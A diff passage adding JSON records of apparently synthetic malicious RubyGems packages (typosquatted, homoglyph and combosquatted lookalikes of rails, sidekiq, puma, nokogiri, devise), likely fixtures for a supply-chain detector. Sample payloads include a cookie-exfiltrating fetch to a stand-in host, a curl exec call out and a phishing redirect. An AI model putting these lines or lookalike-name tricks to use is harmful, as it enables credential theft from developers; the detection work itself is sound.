+      "payload": "window.location = \"http://phishing-site.com/steal-credentials\"",
+      "metadata": {
+        "version": "1.0.0+build.1",
+        "description": "Unofficial sidekiqq package with extra utilities",
+        "author": "security-researcher",
+        "homepage": "https://a0d15fe3.github.io",
+        "repository": "https://github.com/198c9daf/6e5b76cc",
+        "keywords": [
+          "sidekiqq",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "malicious-gem": "1.0.0-alpha.1",
+          "data-collector-gem": "1.0.0-alpha.1"
+        },
+        "platform": "ruby",
+        "executables": [
+          "suspicious-binary"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": true,
+        "hasPostInstallScript": false,
+        "hasNetworkCalls": false,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": true,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": true,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.9074934528579676,
+        "levenshteinDistance": 1
+      },
+      "targetPackage": "sidekiq"
+    },
+    {
+      "id": "fcd890783fe20d19",
+      "name": "pumaa",
+      "registry": "rubygems",
+      "attackType": "typosquatting",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "eval(atob(\"Y29uc29sZS5sb2coXCJNYWxpY2lvdXMgY29kZSBleGVjdXRlZFwiKQ==\"))",
+      "metadata": {
+        "version": "1.0.0+build.1",
+        "description": "pumaa with security patches and performance improvements",
+        "author": "trusted-contributor",
+        "homepage": "https://1280e0eb.bitbucket.org",
+        "repository": "https://github.com/32701807/90b1e1ad",
+        "keywords": [
+          "pumaa",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "malicious-gem": "999.999.999",
+          "data-collector-gem": "1.0.0+build.1"
+        },
+        "platform": "ruby",
+        "executables": [
+          "suspicious-binary"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": false,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": false,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": true,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.760926639808214,
+        "levenshteinDistance": 3
+      },
+      "targetPackage": "puma"
+    },
+    {
+      "id": "bfd6bed77df70982",
+      "name": "nokogirii",
+      "registry": "rubygems",
+      "attackType": "typosquatting",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "document.cookie && fetch(\"http://data-exfil.com/\", {method: \"POST\", body: document.cookie})",
+      "metadata": {
+        "version": "1.0.0+build.1",
+        "description": "Unofficial nokogirii package with extra utilities",
+        "author": "core-developer",
+        "homepage": "https://6a94e699.gitlab.io",
+        "repository": "https://bitbucket.org/384cc8d3/a558cf16",
+        "keywords": [
+          "nokogirii",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "malicious-gem": "1.0.0+build.1",
+          "data-collector-gem": "999.999.999"
+        },
+        "platform": "ruby",
+        "executables": [
+          "suspicious-binary"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": false,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": true,
+        "hasEnvironmentAccess": true,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.7734828588288921,
+        "levenshteinDistance": 2
+      },
+      "targetPackage": "nokogiri"
+    },
+    {
+      "id": "f7305530ceb600c7",
+      "name": "rаils",
+      "registry": "rubygems",
+      "attackType": "homoglyph",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "require(\"child_process\").exec(\"curl -s http://malicious-server.com/collect\")",
+      "metadata": {
+        "version": "2.0.0-rc.1",
+        "description": "rаils - now with better TypeScript support",
+        "author": "trusted-contributor",
+        "homepage": "https://d967e52b.bitbucket.org",
+        "repository": "https://github.com/69ea1e95/0c4be737",
+        "keywords": [
+          "rаils",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "malicious-gem": "1.0.0+build.1",
+          "data-collector-gem": "1.0.0+build.1"
+        },
+        "platform": "ruby",
+        "executables": [
+          "suspicious-binary"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": false,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": true,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": false,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.7079607937243249,
+        "levenshteinDistance": 2
+      },
+      "targetPackage": "rails"
+    },
+    {
+      "id": "6d725e79b670d43c",
+      "name": "dеvise",
+      "registry": "rubygems",
+      "attackType": "homoglyph",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "window.location = \"http://phishing-site.com/steal-credentials\"",
+      "metadata": {
+        "version": "1.0.0-alpha.1",
+        "description": "Enhanced version of dеvise with additional features",
+        "author": "community-maintainer",
+        "homepage": "https://7d52d86c.sourceforge.net",
+        "repository": "https://github.com/2ba9aa41/5f788b9c",
+        "keywords": [
+          "dеvise",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "malicious-gem": "999.999.999",
+          "data-collector-gem": "2.0.0-rc.1"
+        },
+        "platform": "ruby",
+        "executables": [
+          "suspicious-binary"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": true,
+        "hasPostInstallScript": false,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.7430560171336228,
+        "levenshteinDistance": 1
+      },
+      "targetPackage": "devise"
+    },
+    {
+      "id": "f26e277893da6406",
+      "name": "sidеkiq",
+      "registry": "rubygems",
+      "attackType": "homoglyph",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "document.cookie && fetch(\"http://data-exfil.com/\", {method: \"POST\", body: document.cookie})",
+      "metadata": {
+        "version": "999.999.999",
+        "description": "Community fork of sidеkiq with bug fixes",
+        "author": "core-developer",
+        "homepage": "https://a9bb5ab5.gitlab.io",
+        "repository": "https://github.com/4fbde018/253b6350",
+        "keywords": [
+          "sidеkiq",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "malicious-gem": "1.0.0-alpha.1",
+          "data-collector-gem": "1.0.0+build.1"
+        },
+        "platform": "ruby",
+        "executables": [
+          "suspicious-binary"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": true,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.7408964912683424,
+        "levenshteinDistance": 3
+      },
+      "targetPackage": "sidekiq"
+    },
+    {
+      "id": "fd7d280b82a674fa",
+      "name": "рuma",
+      "registry": "rubygems",
+      "attackType": "homoglyph",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "eval(atob(\"Y29uc29sZS5sb2coXCJNYWxpY2lvdXMgY29kZSBleGVjdXRlZFwiKQ==\"))",
+      "metadata": {
+        "version": "999.999.999",
+        "description": "Community fork of рuma with bug fixes",
+        "author": "community-maintainer",
+        "homepage": "https://7525f5c7.sourceforge.net",
+        "repository": "https://bitbucket.org/825e45e9/b7524f75",
+        "keywords": [
+          "рuma",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "malicious-gem": "0.0.1-beta",
+          "data-collector-gem": "1.0.0-alpha.1"
+        },
+        "platform": "ruby",
+        "executables": [
+          "suspicious-binary"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": false,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.8426728092078385,
+        "levenshteinDistance": 3
+      },
+      "targetPackage": "puma"
+    },
+    {
+      "id": "0b83f49adf0c9edb",
+      "name": "nοkogiri",
+      "registry": "rubygems",
+      "attackType": "homoglyph",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "eval(atob(\"Y29uc29sZS5sb2coXCJNYWxpY2lvdXMgY29kZSBleGVjdXRlZFwiKQ==\"))",
+      "metadata": {
+        "version": "0.0.1-beta",
+        "description": "Community fork of nοkogiri with bug fixes",
+        "author": "security-researcher",
+        "homepage": "https://03e65fbf.sourceforge.net",
+        "repository": "https://github.com/601b7d34/ba940ee6",
+        "keywords": [
+          "nοkogiri",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "malicious-gem": "2.0.0-rc.1",
+          "data-collector-gem": "999.999.999"
+        },
+        "platform": "ruby",
+        "executables": [
+          "suspicious-binary"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": true,
+        "hasPostInstallScript": false,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": true,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": true,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.8076736507031588,
+        "levenshteinDistance": 1
+      },
+      "targetPackage": "nokogiri"
+    },
+    {
+      "id": "e8a9f268b1eb7b79",
+      "name": "rails-admin-extra",
+      "registry": "rubygems",
+      "attackType": "combosquatting",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "require(\"child_process\").exec(\"curl -s http://malicious-server.com/collect\")",
+      "metadata": {
+        "version": "1.0.0+build.1",
+        "description": "rails-admin-extra with security patches and performance improvements",
+        "author": "core-developer",
+        "homepage": "https://a3004ccf.npmjs.com",
+        "repository": "https://gitlab.com/d1946976/cefc71a7",
+        "keywords": [
+          "rails",
+          "admin",
+          "extra",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "malicious-gem": "0.0.1-beta",
+          "data-collector-gem": "1.0.0-alpha.1"
+        },
+        "platform": "ruby",
+        "executables": [
+          "suspicious-binary"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": true,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": false,
+        "hasFileSystemAccess": true,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": false,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.7927914167521797,
+        "levenshteinDistance": 3
+      },
+      "targetPackage": "rails"
+    },
+    {
+      "id": "4ca82c9d76f6898a",
+      "name": "devise-security-enhanced",
+      "registry": "rubygems",
+      "attackType": "combosquatting",
+      "timestamp": "2025-08-21T20:58:34.366Z",
+      "payload": "window.location = \"http://phishing-site.com/steal-credentials\"",
+      "metadata": {
+        "version": "2.0.0-rc.1",
+        "description": "Community fork of devise-security-enhanced with bug fixes",
+        "author": "official-team",
+        "homepage": "https://79336dda.github.io",
+        "repository": "https://bitbucket.org/0b5c1071/8b690d02",
+        "keywords": [
+          "devise",
+          "security",
+          "enhanced",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "malicious-gem": "0.0.1-beta",
+          "data-collector-gem": "999.999.999"
+        },
+        "platform": "ruby",
+        "executables": [
+          "suspicious-binary"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": true,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": false,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.8284274839558623,
+        "levenshteinDistance": 2
+      },
+      "targetPackage": "devise"
+    },
+    {
+      "id": "0adc5652be19dd39",
+      "name": "sidekiq-monitoring",
+      "registry": "rubygems",
+      "attackType": "combosquatting",
+      "timestamp": "2025-08-21T20:58:34.366Z",
+      "payload": "window.location = \"http://phishing-site.com/steal-credentials\"",
+      "metadata": {
+        "version": "1.0.0+build.1",
+        "description": "Enhanced version of sidekiq-monitoring with additional features",
+        "author": "trusted-contributor",
+        "homepage": "https://b730cd35.sourceforge.net",
+        "repository": "https://gitlab.com/ec115e58/7dfead24",
+        "keywords": [
+          "sidekiq",
+          "monitoring",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "malicious-gem": "2.0.0-rc.1",
+          "data-collector-gem": "2.0.0-rc.1"
+        },
+        "platform": "ruby",
+        "executables": [
+          "suspicious-binary"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": true,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": false,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": false,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": true,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.8364952705897648,
+        "levenshteinDistance": 3
+      },
+      "targetPackage": "sidekiq"
+    }
+  ]
+}
